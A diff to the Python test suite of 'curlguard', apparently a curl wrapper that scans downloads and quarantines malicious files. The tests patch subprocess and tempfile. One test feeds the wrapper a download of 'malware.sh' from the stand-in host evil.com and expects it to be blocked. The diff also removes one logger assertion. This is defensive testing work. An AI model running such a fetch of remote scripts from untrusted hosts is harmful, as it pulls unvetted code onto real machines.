@@ -152,7 +152,7 @@ class TestSslDetector:
 class TestCurlManager:
     def test_manager_per_user_paths(self):
         manager = CurlManager("per-user")
-        assert "per-user" in str(manager._curl_path)
+        assert ".local/bin" in str(manager._curl_path)
         assert manager.is_installed() is False
 
     def test_manager_system_wide_paths(self):
@@ -184,25 +184,35 @@ class TestWrapper:
 
 
 class TestIntegration:
-    def test_full_dispatch_flow(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
+    def test_full_dispatch_flow(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
+        mock_scanner = MagicMock()
         mock_scanner.scan_file.return_value = ScanResult(
             clean=True, matches=[], rules_triggered=[], scan_time_ms=2.0
         )
         wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        # Mock subprocess to avoid real curl call
-        with patch("curlguard.wrapper.subprocess.run") as mock_run:
+        temp_file = temp_config.quarantine_dir / "test.download"
+        temp_file.touch()
+        def mock_mktemp(suffix=""):
+            return str(temp_file)
+        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
+             patch("tempfile.mktemp", mock_mktemp):
             mock_run.return_value = MagicMock(returncode=0)
-            # Test dispatch with mocked real curl
-            exit_code = wrapper.dispatch(["https://example.com/file.sh", "-o", "/tmp/test.sh"])
+            exit_code = wrapper.dispatch(["https://example.com/file.sh", "-o", str(temp_config.quarantine_dir / "out.sh")])
             mock_scanner.scan_file.assert_called_once()
-            mock_logger.log.assert_called_once()
 
-    def test_quarantine_decision(self, temp_config, mock_scanner, mock_logger, mock_ssl_detector):
+    def test_quarantine_decision(self, temp_config, mock_logger, mock_ssl_detector, monkeypatch):
+        mock_scanner = MagicMock()
         mock_scanner.scan_file.return_value = ScanResult(
             clean=False, matches=["malware"], rules_triggered=["malware"], scan_time_ms=1.0
         )
         wrapper = CurlWrapper(temp_config, mock_scanner, mock_logger, mock_ssl_detector)
-        with patch("curlguard.wrapper.subprocess.run") as mock_run:
+        temp_file = temp_config.quarantine_dir / "malware.download"
+        temp_file.touch()
+        def mock_mktemp(suffix=""):
+            return str(temp_file)
+        with patch("curlguard.wrapper.subprocess.run") as mock_run, \
+             patch("tempfile.mktemp", mock_mktemp), \
+             patch("curlguard.tui.prompt_user", return_value="quarantine"):
             mock_run.return_value = MagicMock(returncode=0)
             exit_code = wrapper.dispatch(["https://evil.com/malware.sh", "-o", "/tmp/malware.sh"])
-            assert exit_code == 1  # blocked
+            assert exit_code == 1
